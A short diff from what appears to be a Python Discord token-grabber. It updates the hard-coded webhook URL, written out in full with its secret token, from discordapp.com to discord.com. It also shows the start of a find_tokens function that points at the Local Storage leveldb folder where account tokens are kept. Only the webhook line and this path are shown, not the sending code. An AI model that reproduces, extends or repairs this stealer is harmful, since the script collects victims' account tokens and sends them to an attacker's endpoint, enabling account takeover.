@@ -2,7 +2,7 @@ import os
 import re
 import json
 from urllib.request import Request, urlopen
-WEBHOOK_URL = 'https://discordapp.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6'
 PING_ME = False
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
